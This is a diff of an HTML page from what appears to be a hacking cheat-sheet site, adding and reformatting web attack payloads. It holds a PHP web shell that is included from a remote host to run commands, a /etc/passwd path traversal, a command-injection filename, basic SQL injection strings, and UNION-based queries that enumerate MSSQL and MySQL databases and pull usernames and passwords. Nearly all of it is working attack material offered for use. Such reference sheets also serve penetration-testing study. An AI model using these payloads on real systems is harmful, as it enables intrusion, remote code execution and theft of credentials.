@@ -127,25 +127,40 @@ http://...index.php?language=/etc/passwd%00.php</code></pre>
                             <pre><code class="language-bash">echo '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php</code></pre>
                             <p>Host the previous file and perform a request to your server to execute the command</p>
                             <p>It is important to serve the parameter using & since if not it will fail. The reason it is beacause you can't nest multiple parameters</p>
-                            http://192.168.1.2:8080/index.php?language=http://10.10.11.14:5555/shell.php&cmd=id
+                            <pre><code class="language-bash">http://192.168.1.2:8080/index.php?language=http://10.10.11.14:5555/shell.php&cmd=id</code></pre>
+                            
                         </ul>
 
                         <h2 id="SQL injection">SQL injection</h2>
                         <ul>
                             <p> Basic payloads</p>
                             <pre><code class="language-sql">'+OR+1=1--
-    ' OR 1=1; --
-    ' OR '1'='1
-    " OR "1"="1" --
-    ' OR 1=1 --
-    ' OR 1'='1
-    ' --</code></pre>
+' OR 1=1; --
+' OR '1'='1
+" OR "1"="1" --
+' OR 1=1 --
+' OR 1'='1
+' --</code></pre>
+
                     <h3>Automate using sqlmap</h3>
                     <div class="banner">
                         <a class="cherry-banner" href="/H4ckV4ult/pages/protocols/sqlmap.html">
                             <h2>  Check for more information ↗️</h2>
                         </a>
                     </div> 
+
+                    <h3 style="color: red;">After attempting to trying payloads like a cracy monkey... Please try to reproduce which type of SQL query can be using the backed in order to display the data</h3>
+                    
+                    <h3> Situationship example</h3>
+                    <ul>
+                        <p>Supose you are in front of a website which allows you to search films based on specific string input. In that case if you issue "test" the website will perfomr</p>
+                        <pre><code class="language-sql">SELECT * FROM films WHERE name like '% $INPUT %'</code></pre>
+                        <p>That way you can identify a filmname which ends with test and attempt the following injection</p>
+                        <pre><code class="language-sql">
+SELECT * FROM films WHERE name like '% test' --%'  # backend query
+test'--</code></pre>   
+                    </ul>
+
 
                     <h3>Union select payloads</h3>
                     <ul>
@@ -157,10 +172,32 @@ cn' UNION select 1,2,3,4 #</code></pre>
                         <p>Identify the number of colums. Remember to try diferent numbers of columns untill you get no errors</p>
                         <pre><code class="language-sql">cn' UNION select 1,2,3,4--</code></pre>
                         <p>Once you have a right number you can start injecting </p>
-                        <pre><code class="language-sql">cn' union select 1,current_user(),3,4#</code></pre>
+                        <pre><code class="language-sql">cn' union select 1,@@version,3,4</code></pre>
 
                         <h4>Information gathering</h4>
                         <ul>
+                        
+                        <!--MSSQL -->    
+                        <div class="button" onclick="toggleDiv()">MSSQL</div>
+                            <div id="foldedDiv" class="content">
+                                <p>Show all databases</p>
+                            <pre><code class="language-sql">SELECT name FROM sys.databases; # Example
+cn' UNION select 1,name,3,4 from sys.databases-- </code></pre>
+                            <p>Show current database</p>
+                            <pre><code class="language-sql">SELECT DB_NAME(); #Example
+cn' UNION select 1,DB_NAME(),3,4--</code></pre>
+                            <p>Show tables</p>
+                            <pre><code class="language-sql">SELECT TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES; #Example
+cn' UNION select 1,TABLE_NAME,3,4 from INFORMATION_SCHEMA.TABLES --</code></pre>    
+                            <p>Show column names</p>        
+                             <pre><code class="language-sql">SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'; #Example
+cn' UNION select 1,COLUMN_NAME,3,4 from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'--</code></pre>    
+                            <p>Show data</p>
+                            <pre><code class="language-sql">cn' UNION SELECT 1,username,3,4,5,6 FROM database_name.dbo.table_name --</code></pre>   
+                            </div> 
+                            <br>
+                            <div class="button" onclick="toggleDiv()">MySQL</div>
+                            <div id="foldedDiv" class="content">
                             <p>Show all databases</p>
                             <pre><code class="language-sql">SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA; # Example
 cn' UNION select 1,SCHEMA_NAME,3,4 from INFORMATION_SCHEMA.SCHEMATA-- </code></pre>
@@ -174,7 +211,9 @@ cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES wher
                              <pre><code class="language-sql">SELECT COLUMN_NAME,TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="users"; #Example
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'--</code></pre>    
                             <p>Show data</p>
-                            <pre><code class="language-sql">cn' UNION select 1,username,password,4 from database.users --</code></pre>        
+                            <pre><code class="language-sql">cn' UNION select 1,username,password,4 from database.users --</code></pre>    
+                            </div>
+                                
                         </ul>
                     </ul>
 
@@ -964,5 +1003,16 @@ file`whoami`.jpg</code></pre>
 
     // Asegurarse de que ambas funciones se ejecuten después de que todo el contenido esté listo
     window.addEventListener('load', generateMenu);
+
+    const botones = document.querySelectorAll(".button");
+
+    botones.forEach(boton => {
+    boton.addEventListener("click", () => {
+        const contenido = boton.nextElementSibling;
+        contenido.style.display =
+        contenido.style.display === "block" ? "none" : "block";
+    });
+    });
+
 </script>
 </html>
